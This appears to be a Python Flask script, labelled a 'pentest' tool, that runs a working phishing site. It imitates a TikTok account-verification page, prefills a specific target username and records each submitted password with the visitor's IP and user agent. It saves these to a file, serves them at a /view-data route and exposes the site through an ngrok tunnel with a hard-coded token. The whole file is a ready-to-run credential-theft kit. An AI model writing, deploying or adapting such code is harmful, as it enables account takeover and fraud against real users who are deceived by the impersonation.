# =============================================================================
# TIKTOK AUTO-PENTEST - PERSISTENT CLOUD EDITION (Render / 24/7)
# =============================================================================

import os
import time
import json
import re
import requests
from flask import Flask, request, render_template_string
import threading
from datetime import datetime
import urllib.parse
import logging
from pyngrok import ngrok, conf

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

TARGET_USERNAME = "chuzii.hu.yar23"
DATA_FILE = "captured_credentials.json"
NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"

# Configure ngrok
conf.get_default().auth_token = NGROK_AUTH_TOKEN
tunnel = ngrok.connect(5000, bind_tls=True)
public_url = tunnel.public_url
print(f"✅ ngrok tunnel established: {public_url}")

# -----------------------------------------------------------------------------
# PHISHING HTML (TikTok Official Look)
# -----------------------------------------------------------------------------
PHISH_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>TikTok - Account Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; margin: 0; }
        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 450px; width: 100%; border: 1px solid #e0e0e0; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 120px; height: auto; }
        .alert { background: #fff3e0; border-left: 4px solid #ff9500; padding: 15px; margin-bottom: 25px; border-radius: 8px; }
        .alert-title { font-weight: bold; color: #ff9500; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border-color: #fe2c55; }
        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #e01e45; }
        .footer { font-size: 12px; color: #666; text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .secure-badge { display: inline-block; background: #e8f5e9; color: #4caf50; padding: 5px 10px; border-radius: 20px; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="120" height="40" viewBox="0 0 120 40">
                <rect width="120" height="40" fill="#fe2c55" rx="8"/>
                <text x="60" y="28" text-anchor="middle" fill="white" font-weight="bold" font-size="20">TikTok</text>
            </svg>
        </div>
        {% if success %}
        <div style="text-align: center; padding: 30px;">
            <div style="font-size: 48px;">✅</div>
            <h2>Verification Successful!</h2>
            <p>Your account has been secured.</p>
            <p><small>Redirecting to TikTok...</small></p>
        </div>
        <script>setTimeout(function(){ window.location.href = 'https://www.tiktok.com'; }, 2000);</script>
        {% else %}
        <div class="alert">
            <div class="alert-title">⚠️ Security Alert</div>
            <div>We detected unusual login activity on @{{username}}</div>
            <div style="font-size: 13px; margin-top: 8px;">Please verify your identity to secure your account.</div>
        </div>
        <form method="POST">
            <label>Username</label>
            <input type="text" name="username" value="{{username}}" readonly style="background:#f5f5f5;">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter your password to verify" required autofocus>
            <button type="submit">Verify Identity</button>
        </form>
        <div class="footer">
            <div>🔒 Verified by TikTok Trust & Safety</div>
            <div class="secure-badge">✓ Secure Connection</div>
            <div style="margin-top: 10px;">This is an automated security check.</div>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

# -----------------------------------------------------------------------------
# Helper to save credentials
# -----------------------------------------------------------------------------
def save_credential(creds):
    """Append captured credentials to JSON file."""
    try:
        with open(DATA_FILE, 'a') as f:
            json.dump(creds, f)
            f.write('\n')
    except Exception as e:
        logging.error(f"Failed to save credentials: {e}")

# -----------------------------------------------------------------------------
# Flask Routes
# -----------------------------------------------------------------------------
@app.route('/', methods=['GET', 'POST'])
@app.route('/@security/verify', methods=['GET', 'POST'])
@app.route('/account/security/verify', methods=['GET', 'POST'])
@app.route('/auth/verify-identity', methods=['GET', 'POST'])
@app.route('/safety/verify-account', methods=['GET', 'POST'])
@app.route('/trustandsafety/verify', methods=['GET', 'POST'])
def phish():
    username = request.args.get('user') or request.args.get('username') or TARGET_USERNAME
    if request.method == 'POST':
        password = request.form.get('password', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.utcnow().isoformat()

        creds = {
            'username': username,
            'password': password,
            'ip': ip,
            'timestamp': timestamp,
            'user_agent': user_agent,
            'full_path': request.full_path
        }

        save_credential(creds)

        logging.info(f"🎉 Credentials captured! Username: {username}, Password: {password}, IP: {ip}")

        return render_template_string(PHISH_HTML, username=username, success=True)

    return render_template_string(PHISH_HTML, username=username, success=False)

# -----------------------------------------------------------------------------
# View captured data (for monitoring)
# -----------------------------------------------------------------------------
@app.route('/view-data')
def view_data():
    try:
        with open(DATA_FILE, 'r') as f:
            lines = f.readlines()
        data = [json.loads(line) for line in lines if line.strip()]
        return {'count': len(data), 'entries': data}
    except FileNotFoundError:
        return {'count': 0, 'entries': []}

# -----------------------------------------------------------------------------
# Run the App
# -----------------------------------------------------------------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
